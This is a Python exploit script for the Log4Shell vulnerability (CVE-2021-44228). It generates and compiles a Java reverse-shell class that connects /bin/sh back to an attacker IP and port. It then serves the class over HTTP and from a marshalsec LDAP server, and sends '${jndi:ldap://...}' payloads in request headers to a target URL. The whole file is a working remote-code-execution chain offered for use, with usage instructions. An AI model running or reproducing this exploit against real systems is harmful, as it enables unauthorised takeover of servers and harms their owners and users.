#!/usr/bin/env python3
import sys, os
from colorama import Fore, Back, Style
import requests
import multiprocessing

from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer


def format_text(title,item):
  cr = '\r\n'
  section_break=cr + '*'*(len(str(item))+len(title)+ 3) + cr 
  item=str(item)
  text= Fore.YELLOW +section_break + Style.BRIGHT+ Fore.RED + title + Fore.RESET +" : "+  Fore.BLUE + item + Fore.YELLOW + section_break + Fore.RESET
  return text

def shellcode(attacker , lport):
	shellcode ='''import java.io.IOException;
    import java.io.InputStream;
    import java.io.OutputStream;
    import java.net.Socket;
    public class Exploit {
        public Exploit() throws Exception {
            String host="'''+attacker+'''";
            int port='''+lport+''';
            String cmd="/bin/sh";
            Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s=new Socket(host,port);
            InputStream pi=p.getInputStream(),
                pe=p.getErrorStream(),
                si=s.getInputStream();
            OutputStream po=p.getOutputStream(),so=s.getOutputStream();
            while(!s.isClosed()) {
                while(pi.available()>0)
                    so.write(pi.read());
                while(pe.available()>0)
                    so.write(pe.read());
                while(si.available()>0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                }
                catch (Exception e){
                }
            };
            p.destroy();
            s.close();
        }
    }'''
	
	# writing the exploit to Exploit.java file
	try:
		filehandler = open("Exploit.java", "w")
		filehandler.write(shellcode)
		filehandler.close()
		a=os.system("./jdk1.8.0_181/bin/javac Exploit.java")
		print(format_text("[*]" , "Exploit shellcode complete"))
	except Exception as e:
		print(format_text('[-] Something went wrong',e))

def web_server(WebServerPort):
    with TCPServer(("0.0.0.0",int(WebServerPort)),SimpleHTTPRequestHandler) as httpd:
        httpd.serve_forever()

def createLdapServer(attacker,web):
    command = "jdk1.8.0_181/bin/java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://" + attacker + ":" + web +"/#Exploit"
    a = os.system(command)
    return a

def exploit(target,attacker):
    payload = '${jndi:ldap://'+attacker+':1389/a}'
    print(format_text("[!] You can use this payload for checking",payload))
    header_dict = {"User-Agent":payload, "X-Api-Version":"${jndi:ldap://x${"+attacker+"}.L4J.0b34rbrwsgg7tnult6qklpxz3.canarytokens.com/a}"}
    request = requests.get(target,headers=header_dict)
    if request.status_code != 503:
        print(format_text("[*] Request Sent",target+" - Status code recieved "+str(request.status_code)))
    

if __name__ == "__main__":  
    try:
        attacker= sys.argv[1]
        web = sys.argv[2]
        lport = sys.argv[3]
        target = sys.argv[4]
        # setting up the things
        shellcode(attacker, lport)
        print(format_text('[+]','Setting up HTTP server'))
        Childprocess0 = multiprocessing.Process(target=web_server,args=(web,))
        Childprocess0.start()
        print(format_text('[+]','Setting up LDAP server'))
        Childprocess1 = multiprocessing.Process(target=createLdapServer, args=(attacker,web,))
        Childprocess1.start()
        exploit(target,attacker)

    except KeyboardInterrupt:
        print(format_text("Error","user interupted the program."))
        sys.exit(0)
    except IndexError:
        print(format_text("[!] CVE-2021-44228 Exploit","Usage: main.py <AttackerIP> <WebServerPort> <LPORT> <TargetURL>"))
        sys.exit(0)
    except Exception as e:
        print(format_text("[-]",e))

        
